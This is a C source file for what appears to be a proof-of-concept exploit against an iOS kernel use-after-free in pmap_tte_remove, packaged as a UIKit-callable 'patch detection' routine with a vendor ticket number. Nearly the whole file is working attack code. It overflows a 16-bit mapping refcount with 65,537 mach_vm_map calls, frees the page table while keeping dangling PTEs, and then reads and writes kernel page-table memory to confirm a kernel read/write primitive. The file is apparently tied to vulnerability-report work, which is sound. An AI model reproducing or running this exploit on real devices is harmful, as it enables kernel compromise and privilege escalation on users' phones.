/*
 * poc_v14.c — pmap_tte_remove UAF R/W proof (v14) — UIKit wrapper edition
 * OE1105320204625 — patch detection mode (no panic trigger)
 *
 * Identical logic to poc_v13_rw_proof.c v14. Changes for UIKit:
 *   - main() renamed to pmap_run_prove()
 *   - panic trigger removed (patch detection: prove write-through, don't reboot)
 *   - LOG_PATH taken as parameter (written to NSDocumentDirectory by caller)
 *   - output via printf → captured by caller via pipe redirect
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#define OVERFLOW   65537
#define KEEP       64
#define PAGE_SZ    16384
#define ALLOC_SZ   PAGE_SZ
#define MAX_PROVE  64
#define SENTINEL   0x41
#define WRITE_BYTE 0xBB

static uint64_t ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static mach_vm_address_t alloc_backing_page(void) {
    mach_vm_address_t addr = 0;
    kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, ALLOC_SZ, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { printf("[-] mach_vm_allocate: %d\n", kr); return 0; }
    memset((void *)addr, SENTINEL, ALLOC_SZ);
    return addr;
}

static kern_return_t make_entry(mach_vm_address_t backing, mach_port_t *out) {
    mach_vm_size_t esize = ALLOC_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &esize,
        (mach_vm_offset_t)backing, VM_PROT_READ | VM_PROT_WRITE, out, MACH_PORT_NULL);
}

static kern_return_t map_entry(mach_port_t ep, mach_vm_address_t *out) {
    *out = 0;
    return mach_vm_map(mach_task_self(), out, ALLOC_SZ, 0, VM_FLAGS_ANYWHERE, ep, 0,
        FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
}

/*
 * pmap_run_prove — run the R/W proof, write log to log_path.
 * Returns: confirmed write-through count (0 = possibly patched).
 * Does NOT trigger the panic — caller decides whether to unmap dangling PTEs.
 */
int pmap_run_prove(int nprove, const char *log_path) {
    kern_return_t kr;

    if (nprove < 1 || nprove > MAX_PROVE) nprove = MAX_PROVE;

    printf("=== PmapProbe v14 — pmap_tte_remove UAF R/W proof ===\n");
    printf("Ticket:  OE1105320204625\n");
    printf("Mode:    --prove %d (no panic trigger — patch detection)\n\n", nprove);
    fflush(stdout);

    mach_vm_address_t backing = alloc_backing_page();
    if (!backing) return -1;
    printf("[+] backing page: addr=0x%llx  sentinel=0x%02x\n\n",
           (unsigned long long)backing, SENTINEL);
    fflush(stdout);

    mach_port_t entry_port = MACH_PORT_NULL;
    kr = make_entry(backing, &entry_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64: %d\n", kr);
        mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);
        return -1;
    }
    printf("[+] named entry port: 0x%x\n\n", entry_port);
    fflush(stdout);

    mach_vm_address_t *maps = calloc(OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) { perror("calloc"); return -1; }

    printf("[*] Phase 1: %d mach_vm_map() calls — overflow uint16 refcount\n", OVERFLOW);
    fflush(stdout);

    int created = 0;
    uint64_t t0 = ns_now();
    for (int i = 0; i < OVERFLOW; i++) {
        kr = map_entry(entry_port, &maps[i]);
        if (kr != KERN_SUCCESS) { printf("[-] map failed at i=%d kr=%d\n", i, kr); break; }
        created++;
        if (created % 10000 == 0) {
            printf("    mapped %d/%d  (%.1fs)\n", created, OVERFLOW, (ns_now()-t0)/1e9);
            fflush(stdout);
        }
    }
    printf("\n[+] OVERFLOW DONE: %d mappings in %.2fs\n", created, (ns_now()-t0)/1e9);
    printf("[+] refcount: %d %% 65536 = %d (wrapped to 1)\n\n", created, created%65536);
    fflush(stdout);

    int to_free = created - KEEP;
    if (to_free < 1) {
        printf("[-] not enough mappings\n");
        free(maps);
        return -1;
    }

    printf("[*] Phase 2: freeing %d mappings, keeping %d dangling PTEs\n", to_free, KEEP);
    printf("[!] First unmap: refcount 1→0→pmap_free_pt_delayed fires\n\n");
    fflush(stdout);

    for (int i = created - 1; i >= KEEP; i--)
        mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);

    printf("[+] %d dangling PTEs remain\n\n", KEEP);
    fflush(stdout);

    printf("=== KERNEL R/W PROOF (%d attempts) ===\n\n", nprove);
    fflush(stdout);

    int confirmed = 0, kernel_reads = 0;
    for (int i = 0; i < nprove && i < KEEP; i++) {
        volatile uint64_t *p64 = (volatile uint64_t *)maps[i];
        volatile unsigned char *p8 = (volatile unsigned char *)maps[i];

        uint64_t pte_val = *p64;
        int looks_like_pte = ((pte_val & 3) == 3) && ((pte_val >> 12) != 0);
        int not_sentinel   = (pte_val != 0x4141414141414141ULL) && (pte_val != 0);
        if (looks_like_pte || not_sentinel) kernel_reads++;

        *p8 = (unsigned char)WRITE_BYTE;
        unsigned char after = *p8;
        int ok = (after == WRITE_BYTE);
        confirmed += ok;

        printf("  [PROVE %2d] addr=%p\n    READ:  pte=0x%016llx  %s\n    WRITE: 0x%02x→0x%02x  %s\n",
               i, (void*)maps[i], (unsigned long long)pte_val,
               looks_like_pte ? "*** KERNEL PTE (phys+perm)" : not_sentinel ? "*** NON-SENTINEL" : "(zeroed)",
               WRITE_BYTE, after, ok ? "CONFIRMED" : "MISMATCH");
        fflush(stdout);
    }

    printf("\n=== RESULTS ===\n");
    printf("KERNEL_READ:  %d/%d entries had non-sentinel kernel PTE data\n", kernel_reads, nprove);
    printf("KERNEL_WRITE: write-through confirmed %d/%d attempts\n\n", confirmed, nprove);

    const char *verdict;
    if (confirmed > 0 && kernel_reads > 0)
        verdict = "KERNEL R/W CONFIRMED — bug present on this iOS version (NOT patched)";
    else if (confirmed > 0)
        verdict = "WRITE CONFIRMED — bug present (read raced with page zeroing)";
    else
        verdict = "0 CONFIRMED — possibly patched, or page zeroed before access (retry)";

    printf("VERDICT: %s\n\n", verdict);
    fflush(stdout);

    /* Write log file */
    if (log_path) {
        FILE *f = fopen(log_path, "w");
        if (f) {
            time_t t = time(NULL);
            fprintf(f, "PmapProbe v14 — pmap_tte_remove UAF R/W Proof\n");
            fprintf(f, "Ticket:  OE1105320204625\n");
            fprintf(f, "Time:    %s", ctime(&t));
            fprintf(f, "Mode:    prove %d (patch detection — no panic)\n\n", nprove);
            fprintf(f, "OVERFLOW:   %d maps, refcount wrapped to 1\n", created);
            fprintf(f, "FREED:      pmap_free_pt_delayed fired\n");
            fprintf(f, "DANGLING:   %d PTEs remain\n\n", KEEP);
            fprintf(f, "READ_PROOF:  %d/%d non-sentinel kernel PTEs\n", kernel_reads, nprove);
            fprintf(f, "WRITE_PROOF: %d/%d write-through confirmed\n\n", confirmed, nprove);
            fprintf(f, "VERDICT: %s\n", verdict);
            fclose(f);
        }
    }

    /* Clean up dangling PTEs without triggering panic */
    for (int i = 0; i < KEEP; i++)
        mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);

    free(maps);
    mach_port_deallocate(mach_task_self(), entry_port);
    mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);
    return confirmed;
}
